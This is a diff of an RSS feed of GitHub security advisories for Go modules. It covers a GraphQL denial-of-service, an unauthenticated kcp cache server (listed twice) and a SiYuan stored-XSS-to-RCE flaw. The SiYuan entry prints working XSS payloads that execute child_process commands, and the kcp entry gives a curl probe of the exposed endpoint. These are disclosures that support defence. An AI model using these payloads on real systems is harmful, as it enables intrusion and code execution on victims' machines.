@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-08T14:30:20.666Z</updated>
+    <updated>2026-04-08T15:25:57.832Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,426 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/platform-mesh/kubernetes-graphql-gateway] kubernetes-graphql-gateway: GraphQL Endpoint Vulnerable to Authenticated Denial-of-Service via Unrestricted Query Execution]]></title>
+        <id>https://github.com/advisories/GHSA-h9mw-h4qc-f5jf</id>
+        <link href="https://github.com/advisories/GHSA-h9mw-h4qc-f5jf"/>
+        <updated>2026-04-08T15:05:11.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>CVSS 6.5 Medium</strong> — The GraphQL API served by kubernetes-graphql-gateway is vulnerable to Denial-of-Service (DoS) attacks due to a complete absence of query resource controls (depth limiting, complexity analysis, response size capping, and rate limiting). An authenticated attacker can craft queries that force the server to compute and serialize multi-megabyte responses, consuming significant CPU, memory, and network bandwidth. Repeated requests can exhaust server resources and degrade or deny service to legitimate users.</p>
+<blockquote>
+<p><strong>Note:</strong> A previous version of this advisory (based on pre-v1 code) documented an unauthenticated attack surface via an HTTP GET method bypass in the former <code>registry.go</code>. That bypass has been removed in v1 — all requests now require a Bearer token. The CVSS score has been adjusted from 7.5 to 6.5 accordingly (Privileges Required: None → Low). CWE-306 (Missing Authentication for Critical Function) no longer applies.</p>
+</blockquote>
+<h2 id="root-cause">Root Cause</h2>
+<p>The kubernetes-graphql-gateway uses the <code>graphql-go/graphql</code> library (v0.8.1) with the <code>graphql-go/handler</code> HTTP handler. The handler is instantiated in <code>gateway/gateway/graphql/graphql.go</code> with only cosmetic configuration — no resource limits:</p>
+<pre><code class="language-go">// gateway/gateway/graphql/graphql.go — CreateHandler()
+func (s *GraphQLServer) CreateHandler(schema *graphql.Schema) *GraphQLHandler {
+    graphqlHandler := handler.New(&amp;handler.Config{
+        Schema:     schema,
+        Pretty:     s.config.Pretty,
+        Playground: s.config.Playground,
+        GraphiQL:   s.config.GraphiQL,
+    })
+    return &amp;GraphQLHandler{
+        Schema:  schema,
+        Handler: graphqlHandler,
+    }
+}
+</code></pre>
+<p>The <code>handler.Config</code> struct does not include <code>MaxDepth</code>, <code>MaxComplexity</code>, <code>MaxResponseSize</code>, or any equivalent fields. Neither the <code>graphql-go/handler</code> nor the underlying <code>graphql-go/graphql</code> library provides built-in query depth or complexity analysis.</p>
+<p>The application configuration (<code>gateway/gateway/config/config.go</code>) has no fields for resource limits:</p>
+<pre><code class="language-go">// gateway/gateway/config/config.go — GraphQL config
+type GraphQL struct {
+    Pretty     bool
+    Playground bool
+    GraphiQL   bool
+}
+</code></pre>
+<p>No rate limiting, throttling, or request size controls exist anywhere in the codebase.</p>
+<h2 id="authentication-model">Authentication Model</h2>
+<p>All requests pass through the HTTP handler in <code>gateway/http/http.go</code>, which extracts a Bearer token and injects it into the request context:</p>
+<pre><code class="language-go">// gateway/http/http.go — Token extraction (applied to all methods)
+s.Handle("/api/clusters/{clusterName}", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+    clusterName := r.PathValue("clusterName")
+    authHeader := r.Header.Get("Authorization")
+    token := strings.TrimPrefix(authHeader, "Bearer ")
+    ctx := utilscontext.SetToken(r.Context(), token)
+    ctx = utilscontext.SetCluster(ctx, clusterName)
+    c.Gateway.ServeHTTP(w, r.WithContext(ctx))
+}))
+</code></pre>
+<p>The token is enforced at the Kubernetes API layer via <code>gateway/gateway/roundtripper/bearer.go</code>, which returns HTTP 401 for requests without a valid token. However, the GraphQL execution engine (query parsing, schema validation, introspection) still runs <strong>before</strong> the Kubernetes API is contacted — meaning authenticated users can trigger expensive operations that consume server resources without hitting the K8s API at all.</p>
+<h2 id="attack-vectors">Attack Vectors</h2>
+<h3 id="1-nested-introspection-field-expansion">1. Nested Introspection Field Expansion</h3>
+<p>The GraphQL schema contains 3,508 types (Kubernetes resources + platform CRDs). Introspection meta-fields (<code>__schema</code>, <code>__type</code>) allow recursive field expansion. Each additional nesting level multiplies the response size exponentially. A single full introspection query generates ~5.2 MB of response data in ~1.15s.</p>
+<h3 id="2-parallel-request-amplification">2. Parallel Request Amplification</h3>
+<p>Without rate limiting, an authenticated attacker can issue many concurrent expensive queries. 5 parallel requests generate ~18.6 MB total response in under 4 seconds with no throttling. At scale (e.g. 999 concurrent requests), the backend becomes unresponsive and returns 503 to all users.</p>
+<h3 id="3-subscription-resource-exhaustion">3. Subscription Resource Exhaustion</h3>
+<p>The <code>HandleSubscription()</code> method in <code>gateway/gateway/graphql/graphql.go</code> processes SSE (Server-Sent Events) subscription requests. A malicious authenticated client can open many subscription channels simultaneously, holding server connections and memory indefinitely:</p>
+<pre><code class="language-go">// gateway/gateway/graphql/graphql.go — HandleSubscription()
+subscriptionChannel := graphql.Subscribe(subscriptionParams)
+for res := range subscriptionChannel {
+    // ... marshal and flush indefinitely ...
+}
+</code></pre>
+<p>There is no limit on the number of concurrent subscriptions, no idle timeout, and no per-client connection cap.</p>
+<h3 id="4-deep-query-execution">4. Deep Query Execution</h3>
+<p>Authenticated users can submit arbitrarily deep and complex GraphQL queries. The GraphQL execution engine processes the full query — consuming CPU and memory for schema validation, field resolution, and error/response formatting — before any Kubernetes API authorization is checked. The request handling in <code>gateway/gateway/endpoint/endpoint.go</code> passes directly to the handler with no query guards:</p>
+<pre><code class="language-go">// gateway/gateway/endpoint/endpoint.go — ServeHTTP()
+func (e *Endpoint) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+    if e.handler == nil || e.handler.Handler == nil {
+        http.Error(w, "Endpoint not ready", http.StatusServiceUnavailable)
+        return
+    }
+    if r.Header.Get("Accept") == "text/event-stream" {
+        e.graphqlServer.HandleSubscription(w, r, e.handler.Schema)
+        return
+    }
+    e.handler.Handler.ServeHTTP(w, r)
+}
+</code></pre>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Availability (High):</strong> Service denial achievable — concurrent expensive queries cause backend to become unresponsive (503 for all users). With 3,508 types and no depth limits, each introspection query generates a ~5.2 MB response. The absence of rate limiting, query complexity controls, and response size caps allows an authenticated attacker to exhaust server CPU, memory, and bandwidth.</li>
+<li><strong>Confidentiality (None):</strong> Information disclosure is covered in a separate finding.</li>
+<li><strong>Integrity (None):</strong> No data modification possible.</li>
+</ul>
+<h2 id="affected-components">Affected Components</h2>
+<ul>
+<li><code>gateway/gateway/graphql/graphql.go</code> — Handler creation with no resource limits; subscription handler with no connection limits</li>
+<li><code>gateway/gateway/endpoint/endpoint.go</code> — Direct passthrough to handler, no query depth/complexity middleware</li>
+<li><code>gateway/gateway/config/config.go</code> — No configuration fields for resource limits</li>
+<li><code>gateway/http/http.go</code> — No rate limiting middleware</li>
+<li><code>graphql-go/graphql</code> library — No built-in depth/complexity limiting</li>
+<li><code>graphql-go/handler</code> — No resource limit configuration options</li>
+</ul>
+<h2 id="recommendations">Recommendations</h2>
+<ol>
+<li><strong>Disable Introspection in Production</strong> — As a defense-in-depth measure, disable introspection in non-development environments. This removes the highest-cost query path. If GraphiQL/Playground must remain accessible for development, gate it behind an environment flag.</li>
+<li><strong>Implement Query Depth and Complexity Limiting</strong> — Implement middleware that parses the query AST and rejects queries exceeding configurable thresholds before execution. Recommended maximum depth: 10 levels. Assign cost values to fields and enforce a maximum query cost budget — introspection meta-fields (<code>__schema</code>, <code>__type</code>) should carry elevated costs. Alternatively, consider migrating to a GraphQL library with built-in depth/complexity support (e.g., <code>gqlgen</code> with its complexity extension, or <code>graph-gophers/graphql-go</code> with its <code>MaxDepth</code> option).</li>
+<li><strong>Implement Rate Limiting and Response Size Controls</strong> — Add per-user rate limiting on the GraphQL endpoint. Suggested thresholds: 60 requests/minute for authenticated users, 2 requests/minute for introspection queries. Cap response payload size (e.g., 5 MB). For subscriptions, enforce maximum concurrent connections per client, idle timeouts, and maximum subscription duration.</li>
+<li><strong>Add Resource Limit Configuration</strong> — Extend the <code>GraphQL</code> struct in <code>gateway/gateway/config/config.go</code> to expose all resource limits (max query depth, max complexity, max response size, rate limit thresholds) as configurable parameters. This ensures all protective thresholds can be tuned per environment without code changes.</li>
+</ol>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html">OWASP GraphQL Cheat Sheet — Resource Limits</a></li>
+<li><a href="https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/">OWASP API4:2023 — Unrestricted Resource Consumption</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/770.html">CWE-770: Allocation of Resources Without Limits or Throttling</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400: Uncontrolled Resource Consumption</a></li>
+</ul>
+<h2 id="classification">Classification</h2>
+<ul>
+<li><strong>CWE-770</strong> — Allocation of Resources Without Limits or Throttling</li>
+<li><strong>CWE-400</strong> — Uncontrolled Resource Consumption</li>
+<li><strong>OWASP Top 10 2021:</strong> A05:2021 — Security Misconfiguration</li>
+<li><strong>OWASP API Security Top 10:</strong> API4:2023 — Unrestricted Resource Consumption</li>
+<li><strong>STRIDE:</strong> Denial of Service (D)</li>
+</ul>
+<h2 id="internal-reference">Internal Reference</h2>
+<p>HASI2026141-32 — Due: 2026-04-16</p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/platform-mesh/kubernetes-graphql-gateway/security/advisories/GHSA-h9mw-h4qc-f5jf">https://github.com/platform-mesh/kubernetes-graphql-gateway/security/advisories/GHSA-h9mw-h4qc-f5jf</a></li>
+<li><a href="https://github.com/platform-mesh/kubernetes-graphql-gateway/commit/61509656fbab2dbf158f634d6700478ee94221ab">https://github.com/platform-mesh/kubernetes-graphql-gateway/commit/61509656fbab2dbf158f634d6700478ee94221ab</a></li>
+<li><a href="https://github.com/platform-mesh/kubernetes-graphql-gateway/releases/tag/v1.2.9">https://github.com/platform-mesh/kubernetes-graphql-gateway/releases/tag/v1.2.9</a></li>
+<li><a href="https://github.com/advisories/GHSA-h9mw-h4qc-f5jf">https://github.com/advisories/GHSA-h9mw-h4qc-f5jf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h9mw-h4qc-f5jf</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-08T15:05:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/kcp-dev/kcp] kcp's cache server is accessible without authentication or authorization checks]]></title>
+        <id>https://github.com/advisories/GHSA-3j3q-wp9x-585p</id>
+        <link href="https://github.com/advisories/GHSA-3j3q-wp9x-585p"/>
+        <updated>2026-04-08T15:04:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The cache server is directly exposed by the root shard and has no authentication or authorization in place.
+This allows anyone who can access the root shard to read and write to the cache server.</p>
+<h3 id="details">Details</h3>
+<p>The cache server is routed in the pre-mux chain in the shard code. 
+The preHandlerChainMux is handled before any authn/authz in the cache server: 
+<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59cbcd0cefb70d94bd8959ce390547c4a2/pkg/server/config.go#L514-L518">https://github.com/kcp-dev/kcp/blob/aaf93d59cbcd0cefb70d94bd8959ce390547c4a2/pkg/server/config.go#L514-L518</a></p>
+<p>This results in the cache server being proxied before any authn/authz in the handler chain takes place.</p>
+<h3 id="attack-vectors">Attack Vectors</h3>
+<h4 id="1-unauthenticated-read-access-primary">1. Unauthenticated Read Access (Primary)</h4>
+<p>An attacker can read all replicated resources from the cache without any credentials. This exposes:</p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Resources</th>
+<th>Severity</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RBAC</td>
+<td>clusterroles, clusterrolebindings (filtered by annotation)</td>
+<td>High</td>
+<td>Only subset with <code>internal.kcp.io/replicate</code> annotation: access rules, APIExport bind/content rules, WorkspaceType use rules. Reveals permission structure for API access and tenancy. Roles/RoleBindings NOT replicated.</td>
+</tr>
+<tr>
+<td>Infrastructure</td>
+<td>logicalclusters, shards</td>
+<td>High</td>
+<td>Reveals full cluster topology and shard configuration</td>
+</tr>
+<tr>
+<td>API surface</td>
+<td>apiexports, apiexportendpointslices, apiresourceschemas</td>
+<td>High</td>
+<td>Reveals all exported APIs and their network endpoints</td>
+</tr>
+<tr>
+<td>Admission control</td>
+<td>mutatingwebhookconfigurations, validatingwebhookconfigurations, validatingadmissionpolicies</td>
+<td>High</td>
+<td>Reveals admission policies, aids bypass</td>
+</tr>
+<tr>
+<td>Tenancy</td>
+<td>workspacetypes</td>
+<td>Medium</td>
+<td>Reveals workspace structure</td>
+</tr>
+<tr>
+<td>Cache metadata</td>
+<td>cachedobjects, cachedresources, cachedresourceendpointslices</td>
+<td>Medium</td>
+<td>Exposes cache state and resource endpoints</td>
+</tr>
+</tbody></table>
+<h4 id="2-write-access-with-race-condition-secondary">2. Write Access with Race Condition (Secondary)</h4>
+<p>The cache server allows full CRUD operations. While injected objects are cleaned up by the replication controller, a race condition exists that could allow temporary privilege escalation.</p>
+<h4 id="the-race-window">The race window:</h4>
+<ol>
+<li>Attacker POSTs a malicious ClusterRole + ClusterRoleBinding to the cache server</li>
+<li>Cache etcd watch fires and notifies two consumers in parallel:
+2.1. The authorization informer (CacheKubeSharedInformerFactory) updates its in-memory store — the GlobalAuthorizer and WorkspaceContentAuthorizer now see the injected RBAC rules
+2.2. The replication controller's informer enqueues a reconcile to its workqueue</li>
+<li>Replication controller worker dequeues, calls getLocalCopy() → not found, deletes the object</li>
+</ol>
+<p>Between steps 2 and 3, any API request hitting the GlobalAuthorizer (<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59c/pkg/authorization/global_authorizer.go#L89-L101">global_authorizer.go:89-101</a>) would evaluate RBAC against a store that includes the attacker's injected rules. The authorization informer and the replication controller share the same CacheKubeSharedInformerFactory (<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59c/pkg/server/config.go#L361">config.go:361</a>), so the object is visible to authorization as soon as the informer cache updates — before the replication controller can process and delete it.</p>
+<p><strong>Practical exploitability is low</strong> — the window is sub-second, requiring the attacker to fire the privileged API request with precise timing. However, it could be automated in a tight loop. The workqueue rate limiter could also widen the window under load.</p>
+<p><strong>Self-healing mechanism:</strong> The replication controller acts as a self-healing mechanism. Objects injected into the cache are deleted almost instantly because:</p>
+<p>Creating an object in cache triggers the cache informer
+Replication controller reconciles, calls getLocalCopy() → not found
+Controller calls deleteObject() on the cache copy (<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59c/pkg/reconciler/cache/replication/replication_reconcile.go#L157-L168">replication_reconcile.go:157-168</a>)</p>
+<h3 id="replicatable">Replicatable</h3>
+<p>Start a kcp root shard and query the cache server, e.g. with:</p>
+<pre><code class="language-sh">curl --insecure 'https://root.vespucci.genericcontrolplane.io:6443/services/cache/shards/root/clusters/root/apis/apis.kcp.io/v1alpha1'
+</code></pre>
+<h3 id="workarounds">Workarounds</h3>
+<p>Network-level access control: Restrict access to /services/cache/* paths at the load balancer, reverse proxy, or firewall level.
+External cache server: Deploy the cache server separately with its own kubeconfig (--cache-server-kubeconfig) and restrict network access to it.</p>
+<h3 id="impact">Impact</h3>
+<p>Who is affected: Any kcp deployment where the root shard is network-reachable by untrusted clients. This applies when:</p>
+<ul>
+<li><strong>Helm chart deployments:</strong> Affected if the shard's Service or Ingress exposes port 6443 externally.</li>
+<li><strong>Operator deployments:</strong> Affected if the Shard resource has spec.externalURL set (or spec.baseURL — externalURL defaults to baseURL if unset). When a shard has an external URL, clients route to it directly, exposing the /services/cache/* path.</li>
+<li><strong>Any deployment method:</strong> If the root shard's --shard-external-url is set and reachable from untrusted networks, the cache server is exposed.</li>
+</ul>
+<p><strong>Not affected:</strong> Deployments where the root shard is behind a front-proxy and is not directly reachable. The front-proxy does not forward /services/cache/* requests.</p>
+<p><strong>Write persistence:</strong> The replication controller watches the cache informer and acts as a self-healing mechanism. Objects injected into the cache are deleted almost instantly (sub-second) because:</p>
+<ul>
+<li>Creating an object in cache triggers the cache informer</li>
+<li>Replication controller reconciles, calls getLocalCopy() → not found</li>
+<li>Controller calls deleteObject() on the cache copy (<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59c/pkg/reconciler/cache/replication/replication_reconcile.go#L157-L168">replication_reconcile.go:157-168</a>)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kcp-dev/kcp/security/advisories/GHSA-3j3q-wp9x-585p">https://github.com/kcp-dev/kcp/security/advisories/GHSA-3j3q-wp9x-585p</a></li>
+<li><a href="https://github.com/kcp-dev/kcp/releases/tag/v0.29.3">https://github.com/kcp-dev/kcp/releases/tag/v0.29.3</a></li>
+<li><a href="https://github.com/kcp-dev/kcp/releases/tag/v0.30.3">https://github.com/kcp-dev/kcp/releases/tag/v0.30.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-3j3q-wp9x-585p">https://github.com/advisories/GHSA-3j3q-wp9x-585p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3j3q-wp9x-585p</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-08T15:04:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/kcp-dev/kcp] kcp's cache server is accessible without authentication or authorization checks]]></title>
+        <id>https://github.com/advisories/GHSA-3j3q-wp9x-585p</id>
+        <link href="https://github.com/advisories/GHSA-3j3q-wp9x-585p"/>
+        <updated>2026-04-08T15:04:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The cache server is directly exposed by the root shard and has no authentication or authorization in place.
+This allows anyone who can access the root shard to read and write to the cache server.</p>
+<h3 id="details">Details</h3>
+<p>The cache server is routed in the pre-mux chain in the shard code. 
+The preHandlerChainMux is handled before any authn/authz in the cache server: 
+<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59cbcd0cefb70d94bd8959ce390547c4a2/pkg/server/config.go#L514-L518">https://github.com/kcp-dev/kcp/blob/aaf93d59cbcd0cefb70d94bd8959ce390547c4a2/pkg/server/config.go#L514-L518</a></p>
+<p>This results in the cache server being proxied before any authn/authz in the handler chain takes place.</p>
+<h3 id="attack-vectors">Attack Vectors</h3>
+<h4 id="1-unauthenticated-read-access-primary">1. Unauthenticated Read Access (Primary)</h4>
+<p>An attacker can read all replicated resources from the cache without any credentials. This exposes:</p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Resources</th>
+<th>Severity</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RBAC</td>
+<td>clusterroles, clusterrolebindings (filtered by annotation)</td>
+<td>High</td>
+<td>Only subset with <code>internal.kcp.io/replicate</code> annotation: access rules, APIExport bind/content rules, WorkspaceType use rules. Reveals permission structure for API access and tenancy. Roles/RoleBindings NOT replicated.</td>
+</tr>
+<tr>
+<td>Infrastructure</td>
+<td>logicalclusters, shards</td>
+<td>High</td>
+<td>Reveals full cluster topology and shard configuration</td>
+</tr>
+<tr>
+<td>API surface</td>
+<td>apiexports, apiexportendpointslices, apiresourceschemas</td>
+<td>High</td>
+<td>Reveals all exported APIs and their network endpoints</td>
+</tr>
+<tr>
+<td>Admission control</td>
+<td>mutatingwebhookconfigurations, validatingwebhookconfigurations, validatingadmissionpolicies</td>
+<td>High</td>
+<td>Reveals admission policies, aids bypass</td>
+</tr>
+<tr>
+<td>Tenancy</td>
+<td>workspacetypes</td>
+<td>Medium</td>
+<td>Reveals workspace structure</td>
+</tr>
+<tr>
+<td>Cache metadata</td>
+<td>cachedobjects, cachedresources, cachedresourceendpointslices</td>
+<td>Medium</td>
+<td>Exposes cache state and resource endpoints</td>
+</tr>
+</tbody></table>
+<h4 id="2-write-access-with-race-condition-secondary">2. Write Access with Race Condition (Secondary)</h4>
+<p>The cache server allows full CRUD operations. While injected objects are cleaned up by the replication controller, a race condition exists that could allow temporary privilege escalation.</p>
+<h4 id="the-race-window">The race window:</h4>
+<ol>
+<li>Attacker POSTs a malicious ClusterRole + ClusterRoleBinding to the cache server</li>
+<li>Cache etcd watch fires and notifies two consumers in parallel:
+2.1. The authorization informer (CacheKubeSharedInformerFactory) updates its in-memory store — the GlobalAuthorizer and WorkspaceContentAuthorizer now see the injected RBAC rules
+2.2. The replication controller's informer enqueues a reconcile to its workqueue</li>
+<li>Replication controller worker dequeues, calls getLocalCopy() → not found, deletes the object</li>
+</ol>
+<p>Between steps 2 and 3, any API request hitting the GlobalAuthorizer (<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59c/pkg/authorization/global_authorizer.go#L89-L101">global_authorizer.go:89-101</a>) would evaluate RBAC against a store that includes the attacker's injected rules. The authorization informer and the replication controller share the same CacheKubeSharedInformerFactory (<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59c/pkg/server/config.go#L361">config.go:361</a>), so the object is visible to authorization as soon as the informer cache updates — before the replication controller can process and delete it.</p>
+<p><strong>Practical exploitability is low</strong> — the window is sub-second, requiring the attacker to fire the privileged API request with precise timing. However, it could be automated in a tight loop. The workqueue rate limiter could also widen the window under load.</p>
+<p><strong>Self-healing mechanism:</strong> The replication controller acts as a self-healing mechanism. Objects injected into the cache are deleted almost instantly because:</p>
+<p>Creating an object in cache triggers the cache informer
+Replication controller reconciles, calls getLocalCopy() → not found
+Controller calls deleteObject() on the cache copy (<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59c/pkg/reconciler/cache/replication/replication_reconcile.go#L157-L168">replication_reconcile.go:157-168</a>)</p>
+<h3 id="replicatable">Replicatable</h3>
+<p>Start a kcp root shard and query the cache server, e.g. with:</p>
+<pre><code class="language-sh">curl --insecure 'https://root.vespucci.genericcontrolplane.io:6443/services/cache/shards/root/clusters/root/apis/apis.kcp.io/v1alpha1'
+</code></pre>
+<h3 id="workarounds">Workarounds</h3>
+<p>Network-level access control: Restrict access to /services/cache/* paths at the load balancer, reverse proxy, or firewall level.
+External cache server: Deploy the cache server separately with its own kubeconfig (--cache-server-kubeconfig) and restrict network access to it.</p>
+<h3 id="impact">Impact</h3>
+<p>Who is affected: Any kcp deployment where the root shard is network-reachable by untrusted clients. This applies when:</p>
+<ul>
+<li><strong>Helm chart deployments:</strong> Affected if the shard's Service or Ingress exposes port 6443 externally.</li>
+<li><strong>Operator deployments:</strong> Affected if the Shard resource has spec.externalURL set (or spec.baseURL — externalURL defaults to baseURL if unset). When a shard has an external URL, clients route to it directly, exposing the /services/cache/* path.</li>
+<li><strong>Any deployment method:</strong> If the root shard's --shard-external-url is set and reachable from untrusted networks, the cache server is exposed.</li>
+</ul>
+<p><strong>Not affected:</strong> Deployments where the root shard is behind a front-proxy and is not directly reachable. The front-proxy does not forward /services/cache/* requests.</p>
+<p><strong>Write persistence:</strong> The replication controller watches the cache informer and acts as a self-healing mechanism. Objects injected into the cache are deleted almost instantly (sub-second) because:</p>
+<ul>
+<li>Creating an object in cache triggers the cache informer</li>
+<li>Replication controller reconciles, calls getLocalCopy() → not found</li>
+<li>Controller calls deleteObject() on the cache copy (<a href="https://github.com/kcp-dev/kcp/blob/aaf93d59c/pkg/reconciler/cache/replication/replication_reconcile.go#L157-L168">replication_reconcile.go:157-168</a>)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kcp-dev/kcp/security/advisories/GHSA-3j3q-wp9x-585p">https://github.com/kcp-dev/kcp/security/advisories/GHSA-3j3q-wp9x-585p</a></li>
+<li><a href="https://github.com/kcp-dev/kcp/releases/tag/v0.29.3">https://github.com/kcp-dev/kcp/releases/tag/v0.29.3</a></li>
+<li><a href="https://github.com/kcp-dev/kcp/releases/tag/v0.30.3">https://github.com/kcp-dev/kcp/releases/tag/v0.30.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-3j3q-wp9x-585p">https://github.com/advisories/GHSA-3j3q-wp9x-585p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3j3q-wp9x-585p</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-08T15:04:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: Remote Code Execution in the Electron desktop client via stored XSS in synced table captions]]></title>
+        <id>https://github.com/advisories/GHSA-phhp-9rm9-6gr2</id>
+        <link href="https://github.com/advisories/GHSA-phhp-9rm9-6gr2"/>
+        <updated>2026-04-08T15:03:55.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A malicious note synced to another user can trigger remote code execution in the SiYuan Electron desktop client. The root cause is that table caption content is stored without safe escaping and later unescaped into rendered HTML, creating a stored XSS sink. Because the desktop renderer runs with <code>nodeIntegration</code> enabled and <code>contextIsolation</code> disabled, attacker-controlled JavaScript executes with access to Node.js APIs. In practice, an attacker can import a crafted note into a synced workspace, wait for the victim to sync, and achieve code execution when the victim opens the note.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability exists in the table caption handling path. When a table block is parsed, the <code>caption</code> attribute is saved into the node's IAL properties without proper HTML escaping. Later, during rendering, that value is read back, passed through HTML unescaping, and written directly into the output DOM. This turns an attacker-controlled caption into active HTML inside the rendered note.</p>
+<p>I confirmed that a crafted table caption containing encoded HTML such as <code>&amp;lt;img src=x onerror=...&amp;gt;</code> is rendered as a live DOM element instead of inert text. This makes the issue a stored XSS. I also confirmed that the most practical delivery path is not Markdown import, but a crafted <code>.sy.zip</code> note imported into a synced workspace. Once synced to another desktop client, opening the note executes the payload automatically.</p>
+<p>In the Electron desktop client, this XSS results in code execution rather than browser-only script execution. The renderer is configured with <code>nodeIntegration: true</code> and <code>contextIsolation: false</code>, so JavaScript running in the note context can call Node.js APIs directly. A payload such as <code>require('child_process').exec('calc')</code> executes successfully, demonstrating code execution on the victim machine in the context of the logged-in user.</p>
+<h3 id="poc">PoC</h3>
+<ul>
+<li>SiYuan Desktop Client A: attacker</li>
+<li>SiYuan Desktop Client B: victim</li>
+<li>Both clients are configured to use the same sync target</li>
+</ul>
+<h3 id="poc-file">PoC File</h3>
+<p>I created a malicious <code>.sy.zip</code> note containing a table block with a crafted <code>caption</code> property.</p>
+<p>Safe validation payload:</p>
+<pre><code class="language-html">&amp;lt;img src=x onerror=alert('caption-xss')&amp;gt;
+</code></pre>
+<p>RCE validation payload on Windows:</p>
+<pre><code class="language-html">&amp;lt;img src=x onerror=require('child_process').exec('calc')&amp;gt;
+</code></pre>
+<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
+<p>1.On Client A, import the crafted <code>.sy.zip</code> note using:</p>
+<p><code>Import -&gt; SiYuan .sy.zip</code></p>
+<p>2.Confirm the imported note appears in the workspace.</p>
+<p>3.Trigger sync on Client A so the malicious note is uploaded to the shared sync target.</p>
+<p>4.On Client B, trigger sync so the note is downloaded from the shared sync target.</p>
+<p>5.Open the synced note on Client B.</p>
+<h3 id="observed-result">Observed Result</h3>
+<p>With the safe payload, JavaScript executes automatically when the victim opens the note.
+With the RCE payload, the Electron renderer executes:</p>
+<pre><code class="language-js">require('child_process').exec('calc')
+</code></pre>
+<p>This launches Calculator on Windows, demonstrating code execution in the victim user's context.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Impact Across All Platforms: Stored XSS</li>
+<li>Electron Desktop App: Remote Code Execution</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-phhp-9rm9-6gr2">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-phhp-9rm9-6gr2</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39846">https://nvd.nist.gov/vuln/detail/CVE-2026-39846</a></li>
+<li><a href="https://github.com/advisories/GHSA-phhp-9rm9-6gr2">https://github.com/advisories/GHSA-phhp-9rm9-6gr2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-phhp-9rm9-6gr2</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-08T15:03:54.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/aws/aws-sdk-go-v2/service/transcribestreaming] Denial of Service due to Panic in AWS SDK for Go v2 SDK EventStream Decoder]]></title>
         <id>https://github.com/advisories/GHSA-xmrv-pmrh-hhx2</id>
@@ -568,340 +988,5 @@ klog.V(2).Infof("Attempting to construct peer configs from annotations: %+v", sa
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-08T00:07:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser: Proxy auth auto-provisioned users inherit Execute permission and Commands]]></title>
-        <id>https://github.com/advisories/GHSA-7526-j432-6ppp</id>
-        <link href="https://github.com/advisories/GHSA-7526-j432-6ppp"/>
-        <updated>2026-04-08T00:05:13.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
